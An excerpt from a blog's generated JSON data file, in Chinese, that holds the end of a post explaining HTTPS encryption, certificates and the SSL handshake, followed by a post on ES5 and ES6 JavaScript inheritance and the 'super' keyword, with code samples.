key</p>\n<p>公钥是公开的，可以随意发布，任何人都可以获得。A使用B发布的公钥加密报文，B接收后使用自己的私钥进行解密，这样私钥不需要传输，也就不必担心被窃取的风险。</p>\n</li>\n</ol>\n<p>对称加密处理速度要比非对称加密要快，所以在保证安全的基础上，应多使用对称加密方式。<strong>TLS采用非对称加密的加密方式</strong>，<strong>HTTPS采用混合加密机制：</strong>大部分通信使用对称密钥加密，但首次交换共享密钥时是使用非对称加密的方式，这样就既保证了安全，又速度最快。</p>\n<h3 id=\"2-3-HTTPS的身份认证功能\"><a href=\"#2-3-HTTPS的身份认证功能\" class=\"headerlink\" title=\"2.3 HTTPS的身份认证功能\"></a>2.3 HTTPS的身份认证功能</h3><p>按照上文介绍的非对称加密方式，会有一个安全缺陷：客户端怎么知道拿到的公钥是否就是服务端发放的公钥呢，因为在拿到的过程中，公钥有可能被掉包。于是为了避免这个缺陷，引入了证书的概念。</p>\n<p><strong>公钥证书</strong></p>\n<p>为了保证公钥是目标服务器发行的公钥，需要使用权威第三方机构（以下称为CA机构）颁发的<strong>公钥证书</strong>：</p>\n<ul>\n<li>服务器去CA机构申请证书，机构颁发加数字签名的公钥证书，数字签名可以使用CA机构的公钥来验证；</li>\n<li>服务器把公钥证书以公开密钥加密方式传给客户端；</li>\n<li>浏览器内会植入常用CA机构的公钥；</li>\n<li>客户端从浏览器拿到CA机构的公钥，并用它验证收到的公钥证书的数字签名，验证通过，证明服务器的公钥值得信任，客户端就从公钥证书取出公钥。</li>\n</ul>\n<p>总结一下就是服务器传递的公钥上有CA的签名，客户端通过验证签名证实服务器的身份，并安全地得到公钥。</p>\n<p>HTTPS首次交换共享密钥使用的是非对称加密方式，这种加密方式会使用公钥证书来验证服务端的身份。而想要验证客户端的身份就不是那么容易了，需要用户去申请证书，而且权威机构的证书是要花钱的，所以客户端身份验证充满挑战。现状是，仅有特殊用途的业务实现了客户端证书，比如那些可支撑客户端证书支出费用的业务，例如银行网银就采用了客户端证书。</p>\n<h3 id=\"2-4-HTTPS的完整性校验功能\"><a href=\"#2-4-HTTPS的完整性校验功能\" class=\"headerlink\" title=\"2.4 HTTPS的完整性校验功能\"></a>2.4 HTTPS的完整性校验功能</h3><p>在HTTPS的通信流程中，应用层发送数据时，会附加一种叫做MAC的报文摘要，MAC能够查知报文是否遭到篡改，从而保护报文的完整性。</p>\n<h2 id=\"三、HTTPS建立通信的过程简介\"><a href=\"#三、HTTPS建立通信的过程简介\" class=\"headerlink\" title=\"三、HTTPS建立通信的过程简介\"></a>三、HTTPS建立通信的过程简介</h2><p>HTTPS首次建立通信时，假设C是客户端client，S是服务器端server，以SSL为例：</p>\n<ol>\n<li><p>C/S会先进行TCP三次握手；</p>\n</li>\n<li><p>然后C发送Client Hello报文及其他SSL信息，表示开始SSL通信过程；</p>\n</li>\n<li><p>S收到后回以Server Hello及其他SSL信息，此外S还发送<strong>公钥证书</strong>，随后发送Server Hello Done通知Client SSL握手协商部分结束</p>\n<p><strong>即SSL第一次握手结束，这个过程最重要的是S把公钥证书交给了C；</strong></p>\n</li>\n<li><p>C验证公钥证书有效性，然后取出公钥，然后：</p>\n<ul>\n<li>回以Client Key Exchange报文，报文中包含通过<strong>公钥加密过的Pre-master-secret</strong>是一个随机密码串。</li>\n<li>C接着发送Change Cipher Spec报文，告诉S此报文后的通信会用Pre-master-secret进行加密。</li>\n<li>C发送Finished报文，并包含上述全部报文的整体校验值。这次握手协商能否成功，要看S是否正确解密该报文。</li>\n</ul>\n</li>\n<li><p>S收到加密过的pre-master secret，用自己的私钥得到pre-master secret，然后：</p>\n<ul>\n<li><p>发送Change Cipher Spec报文</p>\n</li>\n<li><p>S发送Finished报文。</p>\n</li>\n</ul>\n</li>\n<li><p>C/S使用pre-master secret经过一系列步骤生成master secret，使用master secret生成对称密钥session key，之后传输的收据均使用session key加密解密。</p>\n</li>\n</ol>\n<p>至此，<strong>SSL连接建立完成，这个过程最重要的是C把Pre-master-secret用上一步传递的公钥加密后传给S</strong>。之后开始进行HTTP通信，并用共享密钥对通信进行对称加密。</p>\n<h2 id=\"四、HTTPS的问题\"><a href=\"#四、HTTPS的问题\" class=\"headerlink\" title=\"四、HTTPS的问题\"></a>四、<strong>HTTPS的问题</strong></h2><p>当使用SSL时，它的处理速度变慢：</p>\n<ol>\n<li>通信速度变慢，因为除了HTTP请求和响应，还要进行SSL通信，通信量会增加</li>\n<li>因为C/S端都要加密解密，更耗计算资源，SSL加速器可以改善S端问题</li>\n</ol>\n<p>建议的是如果非敏感信息使用HTTP通信，只有在包含个人信息等敏感数据时，才利用HTTPS进行通信。特别是访问量较多的网站在加密处理时，会承担较大的负载，可以仅在需要信息隐藏时才加密，以节约资源。但是查看淘宝、京东都是所有请求都采用的HTTPS，也有搜索到一些讲部分页面采用HTTP，部分页面采用HTTPS的部署方法的博文，因为现在我对部署这一块的东西还比较生疏，所以后续有时间再关注。</p>\n<p><strong>默认端口</strong></p>\n<ol>\n<li>HTTP默认端口80 </li>\n<li>HTTPS默认端口443</li>\n</ol>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><ol>\n<li><a href=\"https://juejin.im/post/5a2fbe1b51882507ae25f991\" target=\"_blank\" rel=\"noopener\">深入理解HTTPS协议</a></li>\n<li>《图解HTTP》</li>\n<li><a href=\"https://cattail.me/tech/2015/11/30/how-https-works.html\" target=\"_blank\" rel=\"noopener\">HTTPS工作原理</a></li>\n<li><a href=\"https://segmentfault.com/q/1010000000192807\" target=\"_blank\" rel=\"noopener\">SSL的保密性、真实性、完整性和不可否认性</a></li>\n<li><a href=\"https://blog.csdn.net/na_tion/article/details/17334669\" target=\"_blank\" rel=\"noopener\">Nginx部署部分https与部分http</a></li>\n</ol>"},{"title":"继承以及Super","date":"2018-05-10T12:30:00.000Z","toc":true,"comments":1,"_content":"一个小小的总结，主要关注以下三个问题：ES5的继承方式，ES5的继承与ES6的继承的区别，ES6的super的几种使用方式以及其中this的指向。\n\n<!-- more -->\n\n> From  [http://supermaryy.com](http://supermaryy.com)\n\n## 一、ES5的继承\n\n[JS实现继承的几种方式](https://www.cnblogs.com/humin/p/4556820.html)\n\n[MDN | Object.create | 用 `Object.create`实现类式继承](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/create)\n\n继承可以分为对象实例的继承，类的继承\n\n## 二、ES6的继承\n\nClass B extends A { } 中的A可以是个class，还可以是个有prototype属性的函数\n\n## 三、ES5继承与ES6继承的区别\n\n1. **this的区别**\n\n   ES5 的继承，实质是先创造子类的实例对象`this`，然后再将父类的方法添加到`this`上面（`Parent.apply(this)`）。ES6 的继承机制完全不同，实质是先将父类实例对象的属性和方法，加到`this`上面（所以必须先调用`super`方法），然后再用子类的构造函数修改`this`。\n\n2. **原型链ES6有两条**\n\n   ```javascript\n   class A { }\n   class B extends A { }\n   \n   B.__proto__ === A // true\n   B.prototype.__proto__ === A.prototype // true\n   ```\n\n   这样的结果是因为，类的继承是按照下面的模式实现的。\n\n   ```javascript\n   class A { }\n   class B { }\n   // B 的实例继承 A 的实例\n   Object.setPrototypeOf(B.prototype, A.prototype);\n   // B 继承 A 的静态属性\n   Object.setPrototypeOf(B, A);\n   const b = new B();\n   \n   //setPrototypeOf的内部实现\n   Object.setPrototypeOf = function (obj, proto) {\n     obj.__proto__ = proto;\n     return obj;\n   }\n   //但是setPrototypeOf会有性能问题，通常推荐使用Object.create\n   ```\n\n3. **ES6可以继承原生构造函数，而ES5不能**\n\n   1. 原生构造函数有：Boolean()、Number()、String()、Array()、Date()、Function()、RegExp()、Error()、Object()\n   2. 原因：\n\n      - ES5 是先新建子类的实例对象`this`，再将父类的属性添加到子类上，由于父类的内部属性无法获取，导致无法继承原生的构造函数。\n\n      - ES6 允许继承原生构造函数定义子类，因为 ES6 是先新建父类的实例对象`this`，然后再用子类的构造函数修饰`this`，使得父类的所有行为都可以继承。\n   3. 继承`Object`的子类，有一个[行为差异](http://stackoverflow.com/questions/36203614/super-does-not-pass-arguments-when-instantiating-a-class-extended-from-object)。\n\n      ```javascript\n      class NewObj extends Object{\n        constructor(){\n       super(...arguments);\n        }\n      }\n      var o = new NewObj({attr: true});\n      o.attr === true  // false\n      ```\n\n      上面代码中，`NewObj`继承了`Object`，但是无法通过`super`方法向父类`Object`传参。这是因为 ES6 改变了`Object`构造函数的行为，一旦发现`Object`方法不是通过`new Object()`这种形式调用，ES6 规定`Object`构造函数会忽略参数。\n\n\n## 四、ES6的super及其this\n\n1. **作为函数**：在子类构造函数中调用 `super()` ，super相当于父类constructor\n\n2. **作为对象**：\n\n   - 在子类**构造函数或普通函数**中使用 `super.methodA()` ，super相当于父类原型\n\n     **此时methodA中的this指向子类实例**\n\n   - 在子类**静态方法**中使用 `super.methodB()`，super指向父类而非原型，此时的methodB指的是父类的静态方法methodB\n\n     **此时methodB中的this指向子类**，所以只能通过this访问到子类的静态方法和属性\n\n3. 在子类中使用super**给属性赋值**  `super.father_prop = 1` ，相当于子类的this  `this.father_prop=1` \n\n   ```javascript\n   class A {\n     constructor() {\n       this.x = 1;\n     }\n   }\n   \n   class B extends A {\n     constructor() {\n       super();\n       this.x = 2;\n       super.x = 3;\n       console.log(super.x); // undefined\n       console.log(this.x); // 3\n     }\n       change(){\n           super.x = 4\n           console.log(super.x); //undefined\n           console.log(this.x);  // 4\n       }\n   }\n   let b = new B();\n   b.change()\n   ```\n\n\n4. 使用`super`的时候，必须显式指定是作为函数、还是作为对象使用，否则会报错。\n\n   ```javascript\n   class A {}\n   \n   class B extends A {\n     constructor() {\n       super();\n       console.log(super); // 报错\n     }\n   }\n   ```\n\n## 五、ES6 的class的本质\n\n1. 不存在任何继承时。`A`作为一个基类（即不存在任何继承），就是一个普通函数，所以直接继承`Function.prototype`。\n\n   ```javascript\n   class A { }\n   A.__proto__ === Function.prototype // true\n   A.prototype.__proto__ === Object.prototype // true\n   ```\n\n## 参考\n\n1. [Class 的继承](http://es6.ruanyifeng.com/#docs/class-extends)\n\n","source":"_posts/JS-inheritance-and-super-of-ES6.md","raw":"---\ntitle: 继承以及Super\ndate: 2018-05-10 20:30:00\ncategories: Javascript #CSS，HTTP，Javascript，NodeJS，框架\ntags: [ES6] #文章标签，可空，多标签请用格式，注意:后面有个空格\ntoc: true\ncomments: true\n---\n一个小小的总结，主要关注以下三个问题：ES5的继承方式，ES5的继承与ES6的继承的区别，ES6的super的几种使用方式以及其中this的指向。\n\n<!-- more -->\n\n> From  [http://supermaryy.com](http://supermaryy.com)\n\n## 一、ES5的继承\n\n[JS实现继承的几种方式](https://www.cnblogs.com/humin/p/4556820.html)\n\n[MDN | Object.create | 用 `Object.create`实现类式继承](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/create)\n\n继承可以分为对象实例的继承，类的继承\n\n## 二、ES6的继承\n\nClass B extends A { } 中的A可以是个class，还可以是个有prototype属性的函数\n\n## 三、ES5继承与ES6继承的区别\n\n1. **this的区别**\n\n   ES5 的继承，实质是先创造子类的实例对象`this`，然后再将父类的方法添加到`this`上面（`Parent.apply(this)`）。ES6 的继承机制完全不同，实质是先将父类实例对象的属性和方法，加到`this`上面（所以必须先调用`super`方法），然后再用子类的构造函数修改`this`。\n\n2. **原型链ES6有两条**\n\n   ```javascript\n   class A { }\n   class B extends A { }\n   \n   B.__proto__ === A // true\n   B.prototype.__proto__ === A.prototype // true\n   ```\n\n   这样的结果是因为，类的继承是按照下面的模式实现的。\n\n   ```javascript\n   class A { }\n   class B { }\n   // B 的实例继承 A 的实例\n   Object.setPrototypeOf(B.prototype, A.prototype);\n   // B 继承 A 的静态属性\n   Object.setPrototypeOf(B, A);\n   const b = new B();\n   \n   //setPrototypeOf的内部实现\n   Object.setPrototypeOf = function (obj, proto) {\n     obj.__proto__ = proto;\n     return obj;\n   }\n   //但是setPrototypeOf会有性能问题，通常推荐使用Object.create\n   ```\n\n3. **ES6可以继承原生构造函数，而ES5不能**\n\n   1. 原生构造函数有：Boolean()、Number()、String()、Array()、Date()、Function()、RegExp()、Error()、Object()\n   2. 原因：\n\n      - ES5 是先新建子类的实例对象`this`，再将父类的属性添加到子类上，由于父类的内部属性无法获取，导致无法继承原生的构造函数。\n\n      - ES6 允许继承原生构造函数定义子类，因为 ES6 是先新建父类的实例对象`this`，然后再用子类的构造函数修饰`this`，使得父类的所有行为都可以继承。\n   3. 继承`Object`的子类，有一个[行为差异](http://stackoverflow.com/questions/36203614/super-does-not-pass-arguments-when-instantiating-a-class-extended-from-object)。\n\n      ```javascript\n      class NewObj extends Object{\n        constructor(){\n       super(...arguments);\n        }\n      }\n      var o = new NewObj({attr: true});\n      o.attr === true  // false\n      ```\n\n      上面代码中，`NewObj`继承了`Object`，但是无法通过`super`方法向父类`Object`传参。这是因为 ES6 改变了`Object`构造函数的行为，一旦发现`Object`方法不是通过`new Object()`这种形式调用，ES6 规定`Object`构造函数会忽略参数。\n\n\n## 四、ES6的super及其this\n\n1. **作为函数**：在子类构造函数中调用 `super()` ，super相当于父类constructor\n\n2. **作为对象**：\n\n   - 在子类**构造函数或普通函数**中使用 `super.methodA()` ，super相当于父类原型\n\n     **此时methodA中的this指向子类实例**\n\n   - 在子类**静态方法**中使用 `super.methodB()`，super指向父类而非原型，此时的methodB指的是父类的静态方法methodB\n\n     **此时methodB中的this指向子类**，所以只能通过this访问到子类的静态方法和属性\n\n3. 在子类中使用super**给属性赋值**  `super.father_prop = 1` ，相当于子类的this  `this.father_prop=1` \n\n   ```javascript\n   class A {\n     constructor() {\n       this.x = 1;\n     }\n   }\n   \n   class B extends A {\n     constructor() {\n       super();\n       this.x = 2;\n       super.x = 3;\n       console.log(super.x); // undefined\n       console.log(this.x); // 3\n     }\n       change(){\n           super.x = 4\n           console.log(super.x); //undefined\n           console.log(this.x);  // 4\n       }\n   }\n   let b = new B();\n   b.change()\n   ```\n\n\n4. 使用`super`的时候，必须显式指定是作为函数、还是作为对象使用，否则会报错。\n\n   ```javascript\n   class A {}\n   \n   class B extends A {\n     constructor() {\n       super();\n       console.log(super); // 报错\n     }\n   }\n   ```\n\n## 五、ES6 的class的本质\n\n1. 不存在任何继承时。`A`作为一个基类（即不存在任何继承），就是一个普通函数，所以直接继承`Function.prototype`。\n\n   ```javascript\n   class A { }\n   A.__proto__ === Function.prototype // true\n   A.prototype.__proto__ === Object.prototype // true\n   ```\n\n## 参考\n\n1. [Class 的继承](http://es6.ruanyifeng.com/#docs/class-extends)\n\n","slug":"JS-inheritance-and-super-of-ES6","published":1,"updated":"2018-08-28T15:35:20.464Z","layout":"post","photos":[],"link":"","_id":"cjldw2dje00000kfyilb8c5yt","content":"<p>一个小小的总结，主要关注以下三个问题：ES5的继承方式，ES5的继承与ES6的继承的区别，ES6的super的几种使用方式以及其中this的指向。</p>\n<a id=\"more\"></a>\n<blockquote>\n<p>From  <a href=\"http://supermaryy.com\">http://supermaryy.com</a></p>\n</blockquote>\n<h2 id=\"一、ES5的继承\"><a href=\"#一、ES5的继承\" class=\"headerlink\" title=\"一、ES5的继承\"></a>一、ES5的继承</h2><p><a href=\"https://www.cnblogs.com/humin/p/4556820.html\" target=\"_blank\" rel=\"noopener\">JS实现继承的几种方式</a></p>\n<p><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/create\" target=\"_blank\" rel=\"noopener\">MDN | Object.create | 用 <code>Object.create</code>实现类式继承</a></p>\n<p>继承可以分为对象实例的继承，类的继承</p>\n<h2 id=\"二、ES6的继承\"><a href=\"#二、ES6的继承\" class=\"headerlink\" title=\"二、ES6的继承\"></a>二、ES6的继承</h2><p>Class B extends A { } 中的A可以是个class，还可以是个有prototype属性的函数</p>\n<h2 id=\"三、ES5继承与ES6继承的区别\"><a href=\"#三、ES5继承与ES6继承的区别\" class=\"headerlink\" title=\"三、ES5继承与ES6继承的区别\"></a>三、ES5继承与ES6继承的区别</h2><ol>\n<li><p><strong>this的区别</strong></p>\n<p>ES5 的继承，实质是先创造子类的实例对象<code>this</code>，然后再将父类的方法添加到<code>this</code>上面（<code>Parent.apply(this)</code>）。ES6 的继承机制完全不同，实质是先将父类实例对象的属性和方法，加到<code>this</code>上面（所以必须先调用<code>super</code>方法），然后再用子类的构造函数修改<code>this</code>。</p>\n</li>\n<li><p><strong>原型链ES6有两条</strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">A</span> </span>&#123; &#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">B</span> <span class=\"keyword\">extends</span> <span class=\"title\">A</span> </span>&#123; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">B.__proto__ === A <span class=\"comment\">// true</span></span><br><span class=\"line\">B.prototype.__proto__ === A.prototype <span class=\"comment\">// true</span></span><br></pre></td></tr></table></figure>\n<p>这样的结果是因为，类的继承是按照下面的模式实现的。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">A</span> </span>&#123; &#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">B</span> </span>&#123; &#125;</span><br><span class=\"line\"><span class=\"comment\">// B 的实例继承 A 的实例</span></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.setPrototypeOf(B.prototype, A.prototype);</span><br><span class=\"line\"><span class=\"comment\">// B 继承 A 的静态属性</span></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.setPrototypeOf(B, A);</span><br><span class=\"line\"><span class=\"keyword\">const</span> b = <span class=\"keyword\">new</span> B();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//setPrototypeOf的内部实现</span></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.setPrototypeOf = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">obj, proto</span>) </span>&#123;</span><br><span class=\"line\">  obj.__proto__ = proto;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> obj;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//但是setPrototypeOf会有性能问题，通常推荐使用Object.create</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>ES6可以继承原生构造函数，而ES5不能</strong></p>\n<ol>\n<li>原生构造函数有：Boolean()、Number()、String()、Array()、Date()、Function()、RegExp()、Error()、Object()</li>\n<li><p>原因：</p>\n<ul>\n<li><p>ES5 是先新建子类的实例对象<code>this</code>，再将父类的属性添加到子类上，由于父类的内部属性无法获取，导致无法继承原生的构造函数。</p>\n</li>\n<li><p>ES6 允许继承原生构造函数定义子类，因为 ES6 是先新建父类的实例对象<code>this</code>，然后再用子类的构造函数修饰<code>this</code>，使得父类的所有行为都可以继承。</p>\n</li>\n</ul>\n</li>\n<li><p>继承<code>Object</code>的子类，有一个<a href=\"http://stackoverflow.com/questions/36203614/super-does-not-pass-arguments-when-instantiating-a-class-extended-from-object\" target=\"_blank\" rel=\"noopener\">行为差异</a>。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">NewObj</span> <span class=\"keyword\">extends</span> <span class=\"title\">Object</span></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>()&#123;</span><br><span class=\"line\"> <span class=\"keyword\">super</span>(...arguments);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> o = <span class=\"keyword\">new</span> NewObj(&#123;<span class=\"attr\">attr</span>: <span class=\"literal\">true</span>&#125;);</span><br><span class=\"line\">o.attr === <span class=\"literal\">true</span>  <span class=\"comment\">// false</span></span><br></pre></td></tr></table></figure>\n<p>上面代码中，<code>NewObj</code>继承了<code>Object</code>，但是无法通过<code>super</code>方法向父类<code>Object</code>传参。这是因为 ES6 改变了<code>Object</code>构造函数的行为，一旦发现<code>Object</code>方法不是通过<code>new Object()</code>这种形式调用，ES6 规定<code>Object</code>构造函数会忽略参数。</p>\n</li>\n</ol>\n</li>\n</ol>\n<h2 id=\"四、ES6的super及其this\"><a href=\"#四、ES6的super及其this\" class=\"headerlink\" title=\"四、ES6的super及其this\"></a>四、ES6的super及其this</h2><ol>\n<li><p><strong>作为函数</strong>：在子类构造函数中调用 <code>super()</code> ，super相当于父类constructor</p>\n</li>\n<li><p><strong>作为对象</strong>：</p>\n<ul>\n<li><p>在子类<strong>构造函数或普通函数</strong>中使用 <code>super.methodA()</code> ，super相当于父类原型</p>\n<p><strong>此时methodA中的this指向子类实例</strong></p>\n</li>\n<li><p>在子类<strong>静态方法</strong>中使用 <code>super.methodB()</code>，super指向父类而非原型，此时的methodB指的是父类的静态方法methodB</p>\n<p><strong>此时methodB中的this指向子类</strong>，所以只能通过this访问到子类的静态方法和属性</p>\n</li>\n</ul>\n</li>\n<li><p>在子类中使用super<strong>给属性赋值</strong>  <code>super.father_prop = 1</code> ，相当于子类的this  <code>this.father_prop=1</code> </p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">A</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.x = <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">B</span> <span class=\"keyword\">extends</span> <span class=\"title\">A</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">super</span>();</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.x = <span class=\"number\">2</span>;</span><br><span class=\"line\">    <span class=\"keyword\">super</span>.x = <span class=\"number\">3</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"keyword\">super</span>.x); <span class=\"comment\">// undefined</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>.x); <span class=\"comment\">// 3</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">    change()&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>.x = <span class=\"number\">4</span></span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"keyword\">super</span>.x); <span class=\"comment\">//undefined</span></span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>.x);  <span class=\"comment\">// 4</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">let</span> b = <span class=\"keyword\">new</span> B();</span><br><span class=\"line\">b.change()</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>使用<code>super</code>的时候，必须显式指定是作为函数、还是作为对象使用，否则会报错。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">A</span> </span>&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">B</span> <span class=\"keyword\">extends</span> <span class=\"title\">A</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">super</span>();</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"keyword\">super</span>); <span class=\"comment\">// 报错</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"五、ES6-的class的本质\"><a href=\"#五、ES6-的class的本质\" class=\"headerlink\" title=\"五、ES6 的class的本质\"></a>五、ES6 的class的本质</h2><ol>\n<li><p>不存在任何继承时。<code>A</code>作为一个基类（即不存在任何继承），就是一个普通函数，所以直接继承<code>Function.prototype</code>。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">A</span> </span>&#123; &#125;</span><br><span class=\"line\">A.__proto__ === <span class=\"built_in\">Function</span>.prototype <span class=\"comment\">// true</span></span><br><span class=\"line\">A.prototype.__proto__ === <span class=\"built_in\">Object</span>.prototype <span class=\"comment\">// true</span></span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><ol>\n<li><a href=\"http://es6.ruanyifeng.com/#docs/class-extends\" target=\"_blank\" rel=\"noopener\">Class 的继承</a></li>\n</ol>\n","site":{"data":{}},"excerpt":"<p>一个小小的总结，主要关注以下三个问题：ES5的继承方式，ES5的继承与ES6的继承的区别，ES6的super的几种使用方式以及其中this的指向。</p>","more":"<blockquote>\n<p>From  <a href=\"http://supermaryy.com\">http://supermaryy.com</a></p>\n</blockquote>\n<h2 id=\"一、ES5的继承\"><a href=\"#一、ES5的继承\" class=\"headerlink\" title=\"一、ES5的继承\"></a>一、ES5的继承</h2><p><a href=\"https://www.cnblogs.com/humin/p/4556820.html\" target=\"_blank\" rel=\"noopener\">JS实现继承的几种方式</a></p>\n<p><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/create\" target=\"_blank\" rel=\"noopener\">MDN | Object.create | 用 <code>Object.create</code>实现类式继承</a></p>\n<p>继承可以分为对象实例的继承，类的继承</p>\n<h2 id=\"二、ES6的继承\"><a href=\"#二、ES6的继承\" class=\"headerlink\" title=\"二、ES6的继承\"></a>二、ES6的继承</h2><p>Class B extends A { } 中的A可以是个class，还可以是个有prototype属性的函数</p>\n<h2 id=\"三、ES5继承与ES6继承的区别\"><a href=\"#三、ES5继承与ES6继承的区别\" class=\"headerlink\" title=\"三、ES5继承与ES6继承的区别\"></a>三、ES5继承与ES6继承的区别</h2><ol>\n<li><p><strong>this的区别</strong></p>\n<p>ES5 的继承，实质是先创造子类的实例对象<code>this</code>，然后再将父类的方法添加到<code>this</code>上面（<code>Parent.apply(this)</code>）。ES6 的继承机制完全不同，实质是先将父类实例对象的属性和方法，加到<code>this</code>上面（所以必须先调用<code>super</code>方法），然后再用子类的构造函数修改<code>this</code>。</p>\n</li>\n<li><p><strong>原型链ES6有两条</strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">A</span> </span>&#123; &#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">B</span> <span class=\"keyword\">extends</span> <span class=\"title\">A</span> </span>&#123; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">B.__proto__ === A <span class=\"comment\">// true</span></span><br><span class=\"line\">B.prototype.__proto__ === A.prototype <span class=\"comment\">// true</span></span><br></pre></td></tr></table></figure>\n<p>这样的结果是因为，类的继承是按照下面的模式实现的。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span 